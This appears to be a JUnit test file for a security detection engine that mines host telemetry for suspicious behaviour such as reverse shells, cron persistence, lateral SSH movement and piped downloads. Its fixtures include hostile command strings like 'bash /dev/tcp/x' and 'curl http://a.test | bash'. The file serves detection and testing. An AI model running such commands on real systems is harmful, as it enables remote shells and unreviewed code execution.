package com.sls.hunter.flink;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.InputStream;
import java.time.LocalDate;
import java.util.*;

import org.junit.jupiter.api.Test;

class RulesTest {
  static MiningConfig config() {
    Properties p = new Properties();
    p.setProperty("fleet.mode", "exact");
    p.setProperty("target.start.date", "2026-06-10");
    return new MiningConfig(p);
  }

  static Event event(String id, String family, String day, String host, String proc, String cmd) {
    return Event.parse(
        Json.write(
            Json.obj(
                "event_id",
                id,
                "index_family",
                family,
                "payload",
                Json.obj(
                    "@timestamp",
                    day + "T10:00:00+08:00",
                    "host_ip",
                    host,
                    "username",
                    "root",
                    "proc_name",
                    proc,
                    "cmdline",
                    cmd))));
  }

  @Test
  @SuppressWarnings("unchecked")
  void pythonOracle() throws Exception {
    try (InputStream in = getClass().getResourceAsStream("/oracle.json")) {
      List<Map<String, Object>> cases = Json.MAPPER.readValue(in, List.class);
      int i = 0;
      for (Map<String, Object> c : cases) {
        List<Event> s = new ArrayList<>();
        for (Map<String, Object> row : (List<Map<String, Object>>) c.get("samples")) {
          Event e = new Event();
          e.fields = row;
          s.add(e);
        }
        Scoring.Adjustment a =
            Scoring.adjust(
                c.get("family").toString(),
                ((Number) c.get("base")).doubleValue(),
                c.get("proc").toString(),
                s,
                (Map<String, Integer>) c.get("templates"),
                (Map<String, Integer>) c.get("chains"),
                new HashSet<String>((List<String>) c.get("paths")),
                ((Number) c.get("fleet")).intValue());
        assertEquals(
            ((Number) c.get("expected")).doubleValue(), a.score(), 0.00001, "case " + i + " " + c);
        assertEquals(
            ((Map<?, ?>) c.get("detail")).get("structural_reasons"),
            a.breakdown().get("structural_reasons"),
            "reasons " + i);
        i++;
      }
    }
  }

  @Test
  void templatesAndBoundary() {
    assertEquals("echo <*>", Templates.command("echo １２３"));
    assertEquals("/api/<N>", Templates.uri("/api/１２３"));
    assertEquals(
        "curl <URL> <*> /tmp/<*>", Templates.command("curl https://a.test/1 123 /tmp/123"));
    assertEquals("/api/<ID>/<N>", Templates.uri("/api/abcdef0123/42?q=12"));
    assertEquals(J8.list("a", "b"), Templates.parents("[{\"x\":\"a\"},\"b\"]"));
    assertEquals("a → b", Templates.chain("[\"a\",\"b\"]"));
  }

  @Test
  void identityAndEarliestSamples() {
    DayBucket b = new DayBucket();
    for (int i = 15; i >= 0; i--) {
      Event e = event("e" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", "echo " + i);
      e.time = i;
      assertTrue(b.add(e));
      assertFalse(b.add(e));
    }
    assertEquals(16, b.events);
    assertEquals(12, b.triples.values().iterator().next().samples.size());
    assertEquals(0, b.triples.values().iterator().next().samples.get(0).time);
  }

  @Test
  void dnsThresholdUsesFullCountPerHost() throws Exception {
    DayBucket bucket = new DayBucket();
    for (int i = 0; i < 50; i++) {
      bucket.add(event("a" + i, "tracing_sas_linux", "2026-06-10", "a", "dig", "dig example.org"));
      if (i < 49) bucket.add(event("b" + i, "tracing_sas_linux", "2026-06-10", "b", "dig", "dig example.org"));
    }
    bucket = Json.MAPPER.readValue(Json.write(bucket), DayBucket.class);
    Properties p = new Properties();
    p.setProperty("history.compare", "false");
    List<Map<String, Object>> rows = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"),
        Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals();
    List<Map<String, Object>> dns = new ArrayList<>();
    for (Map<String, Object> row : rows) if ("dns_high_freq_suspicious".equals(row.get("behavior_label"))) dns.add(row);
    assertEquals(1, dns.size());
    assertEquals("a", dns.get(0).get("host_ip"));
    assertEquals(50L, dns.get(0).get("hit_count"));
  }

  @Test
  void behaviorCountsArePerHostFullAndExcludeBeforeCounting() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    for (int i = 0; i < 40; i++) {
      baseline.add(event("base" + i, "tracing_sas_linux", "2026-06-09", "a", "bash", "bash /dev/tcp/x"));
    }
    for (int i = 0; i < 100; i++) {
      Event e = event("target" + i, "tracing_sas_linux", "2026-06-10", "a", "bash", "bash /dev/tcp/x");
      target.add(e);
    }
    target.add(event("other", "tracing_sas_linux", "2026-06-10", "b", "bash", "bash /dev/tcp/x"));
    for (int i = 0; i < 35; i++) {
      Event e = event("excluded" + i, "tracing_sas_linux", "2026-06-10", "c", "bash", "cat /etc/cron.d/foo");
      e.fields.put("cmd_chain", "apt");
      target.add(e);
    }
    target.add(event("included", "tracing_sas_linux", "2026-06-10", "c", "bash", "cat /etc/cron.d/foo"));
    Map<String, DayBucket> days = new HashMap<>();
    days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    List<Map<String, Object>> rows = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals();
    Map<String, Object> a = rows.stream().filter(r -> "reverse_shell".equals(r.get("behavior_label")) && "a".equals(r.get("host_ip"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(100L, a.get("hit_count"));
    assertEquals(40L, a.get("baseline_max_count"));
    assertEquals(2.44, a.get("spike_ratio"));
    assertTrue(rows.stream().anyMatch(r -> "reverse_shell".equals(r.get("behavior_label")) && "b".equals(r.get("host_ip"))));
    Map<String, Object> c = rows.stream().filter(r -> "cron_persistence".equals(r.get("behavior_label")) && "c".equals(r.get("host_ip"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(1L, c.get("hit_count"));
  }

  @Test
  void legacyBehaviorStateRequiresReplay() throws Exception {
    DayBucket old = Json.MAPPER.readValue("{\"patterns\":{\"reverse_shell\":{\"count\":40,\"samples\":[]}}}", DayBucket.class);
    assertThrows(IllegalStateException.class, () -> old.add(event("a", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
    assertThrows(IllegalStateException.class, () -> MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", old), config()));
  }

  @Test
  void lateralCountsOnlyNovelDestinationsAfterSamplingLimit() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    Event known = event("base", "tracing_sas_linux", "2026-06-09", "a", "ssh", "ssh user@host");
    known.fields.put("dst_ip", "10.0.0.1");
    baseline.add(known);
    for (int i = 0; i < 38; i++) {
      Event e = event("ssh" + i, "tracing_sas_linux", "2026-06-10", "a", "ssh", "ssh user@host");
      e.time += i;
      e.fields.put("dst_ip", i < 35 ? "10.0.0.1" : "10.0.0.2");
      target.add(e);
    }
    Map<String, DayBucket> days = new HashMap<>();
    days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
        .filter(r -> "ssh_lateral_novel_target".equals(r.get("behavior_label"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(3L, row.get("hit_count"));
    assertEquals(0L, row.get("baseline_max_count"));
  }

  @Test
  void baselineIsSumNotPeak() {
    Map<String, DayBucket> days = new TreeMap<String, DayBucket>();
    for (int d = 5; d <= 9; d++) {
      DayBucket b = new DayBucket();
      for (int i = 0; i < 2; i++)
        b.add(event(d + "-" + i, "tracing_sas_linux", "2026-06-0" + d, "a", "echo", "echo hi"));
      days.put("2026-06-0" + d, b);
    }
    DayBucket target = new DayBucket();
    for (int i = 0; i < 22; i++)
      target.add(event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
    days.put("2026-06-10", target);
    MiningEngine.Result r =
        MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config());
    Map<String, Object> s =
        r.signals().stream()
            .filter(m -> m.get("proc_name").equals("echo"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals(10L, s.get("baseline_count_max"));
    assertEquals(2.0, s.get("spike_ratio"));
    assertEquals(1, s.get("fleet_proc_hosts_in_baseline"));
  }

  @Test
  void unseenBehaviorAfterSampleLimitDoesNotChangeTemplates() {
    DayBucket b = new DayBucket();
    for (int i = 0; i < 9; i++) {
      Event e =
          event(
              "t" + i,
              "tracing_sas_linux",
              "2026-06-10",
              "a",
              "echo",
              i < 8 ? "echo hello" : "echo OTHER");
      e.time = i;
      b.add(e);
    }
    MiningEngine.Result r =
        MiningEngine.evaluate(
            "tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", b), config());
    Map<String, Object> s =
        r.signals().stream()
            .filter(m -> m.get("proc_name").equals("echo"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals(1, ((List<?>) s.get("novel_templates")).size());
  }

  @Test
  @SuppressWarnings("unchecked")
  void historyCompareOffKeepsRuleHitsOnly() {
    Properties properties = new Properties();
    properties.setProperty("fleet.mode", "exact");
    properties.setProperty("history.compare", "false");
    properties.setProperty("target.start.date", "2026-06-10");
    DayBucket bucket = new DayBucket();
    bucket.add(event("e1", "tracing_sas_linux", "2026-06-10", "10.0.0.8", "echo", "echo hi"));
    bucket.add(event("g", "tracing_sas_linux", "2026-06-10", "10.0.0.8", "ngrok", "ngrok http 80"));
    bucket.add(
        event(
            "c",
            "tracing_sas_linux",
            "2026-06-10",
            "10.0.0.8",
            "curl",
            "curl http://a.test | bash"));
    MiningEngine.Result result =
        MiningEngine.evaluate(
            "tracing_sas_linux",
            LocalDate.parse("2026-06-10"),
            Collections.singletonMap("2026-06-10", bucket),
            new MiningConfig(properties));
    assertTrue(result.signals().stream().noneMatch(signal -> signal.get("proc_name").equals("echo")));
    assertEquals(Boolean.FALSE, result.stats().get("history_compare"));
    Map<String, Object> gateway =
        result.signals().stream()
            .filter(signal -> signal.get("proc_name").equals("ngrok") && signal.get("signal_type").equals("rule_match"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertTrue(
        ((List<?>) ((Map<?, ?>) gateway.get("score_breakdown")).get("structural_reasons"))
            .contains("rare_gateway_proc"));
    Map<String, Object> piped =
        result.signals().stream()
            .filter(signal -> signal.get("proc_name").equals("curl"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals("rule_match", piped.get("signal_type"));
    assertTrue(
        ((List<?>) ((Map<?, ?>) piped.get("score_breakdown")).get("structural_reasons"))
            .contains("pipe_to_interpreter"));
    assertTrue(
        result.signals().stream()
            .noneMatch(
                signal ->
                    J8.set("novel_host", "novel_triple", "history_diff", "novel_template")
                        .contains(signal.get("signal_type"))));
  }

  @Test
  void nginxRule() {
    DayBucket b = new DayBucket();
    for (int i = 0; i < 2; i++) {
      Event e = event("n" + i, "tracing_nginx_hertzbeat", "2026-06-10", "a", "", "");
      e.fields.put("uri", "/new/42?q=1");
      e.fields.put("upstream_addr", "10.0.0.1:80");
      b.add(e);
    }
    MiningEngine.Result r =
        MiningEngine.evaluate(
            "tracing_nginx_hertzbeat",
            LocalDate.parse("2026-06-10"),
            Collections.singletonMap("2026-06-10", b),
            config());
    assertEquals(2, r.signals().size());
    assertEquals(44.8, ((Number) r.signals().get(0).get("score")).doubleValue());
  }

  @Test
  void targetStartDefaultsToThreeDaysBeforeStart() {
    Properties properties = new Properties();
    properties.setProperty("fleet.mode", "exact");
    assertEquals(LocalDate.now(Event.ZONE).minusDays(3), new MiningConfig(properties).firstTarget);
    properties.setProperty("target.start.date", " 2026-06-10 ");
    assertEquals(LocalDate.parse("2026-06-10"), new MiningConfig(properties).firstTarget);
  }

  @Test
  void classpathConfig() throws Exception {
    MiningConfig loaded = MiningConfig.load(new String[] {"--config", "classpath:config/sample.properties"});
    assertEquals("classpath-test:9092", loaded.get("kafka.bootstrap.servers", ""));
    assertThrows(
        IllegalArgumentException.class,
        () -> MiningConfig.load(new String[] {"--config", "classpath:missing.properties"}));
  }

  @Test
  void malformedInputRejected() {
    assertThrows(IllegalArgumentException.class, () -> Event.parse("{}"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            Event.parse(
                "{\"index_family\":\"tracing_sas_linux\",\"payload\":{\"@timestamp\":\"2026-06-10\"}}"));
  }

  @Test
  void rawSasRecordTakesFamilyFromTopic() {
    Event event =
        Event.parse(
            "{\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.2\",\"username\":\"root\",\"proc_name\":\"curl\",\"cmdline\":\"curl http://example.org/a\",\"cmd_chain\":\"[]\"}",
            "topic-sas-linux-test",
            5,
            1045024395L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", event.family);
    assertEquals("EVENT", event.kind);
    assertEquals("2026-06-10", event.day);
    assertEquals("topic-sas-linux-test:5:1045024395", event.id);
    assertEquals("10.0.0.2", event.s("host_ip"));
    assertEquals("curl", event.s("proc_name"));
    String stamped = "{\"@timestamp\":\"2026-06-10T12:00:00+08:00\"}";
    assertEquals(
        "tracing_sas_win",
        Event.parse(stamped, "topic-sas-win-test", 0, 1L, Collections.<String, String>emptyMap())
            .family);
    assertEquals(
        "tracing_sas_jumper",
        Event.parse(stamped, "topic-sas-jumper-test", 0, 1L, Collections.<String, String>emptyMap())
            .family);
  }

  @Test
  void documentIdAndIndexNameIdentifyRawRecord() {
    Map<String, String> families = new HashMap<String, String>();
    families.put("custom-topic", "tracing_sas_win");
    Event configured =
        Event.parse(
            "{\"_id\":\"doc-1\",\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.3\",\"proc_name\":\"cmd.exe\"}",
            "custom-topic",
            0,
            1L,
            families);
    assertEquals("tracing_sas_win", configured.family);
    assertEquals("doc-1", configured.id);
    Event wrapped =
        Event.parse(
            "{\"_index\":\"aiops-sas-linux-test-2026.06.10\",\"_id\":\"abc\",\"_source\":{\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.2\",\"proc_name\":\"curl\"}}",
            "unknown-topic",
            0,
            8L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", wrapped.family);
    assertEquals("abc", wrapped.id);
    assertEquals("curl", wrapped.s("proc_name"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            Event.parse(
                "{\"index_family\":\"sas_linux\",\"@timestamp\":\"2026-06-10T12:00:00+08:00\"}",
                "topic-sas-linux-test",
                0,
                1L,
                Collections.<String, String>emptyMap()));
  }

  @Test
  void rawConnectLogUsesStartTimeAndCmdChain() {
    String chain =
        Json.write(
            J8.list(
                Json.obj(
                    "1559560", "/usr/bin/python3 /opt/nmap-tools/nmap_tools.py /data/scanner.conf")));
    Event event =
        Event.parse(
            Json.write(
                Json.obj(
                    "host_ip",
                    "172.31.25.3",
                    "username",
                    "root",
                    "proc_name",
                    "python3.9",
                    "pid",
                    "1559560",
                    "proc_start_time",
                    "2026-11-06 02:00:01",
                    "start_time",
                    "1793913969",
                    "uuid",
                    "inet-same",
                    "cmd_chain",
                    chain)),
            "topic-sas-linux-test",
            5,
            1045024395L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", event.family);
    assertEquals("2026-11-06", event.day);
    assertEquals(1793913969L * 1000L, event.time);
    assertEquals("topic-sas-linux-test:5:1045024395", event.id);
    assertEquals(
        "/usr/bin/python3 /opt/nmap-tools/nmap_tools.py /data/scanner.conf", event.s("cmdline"));
  }
}
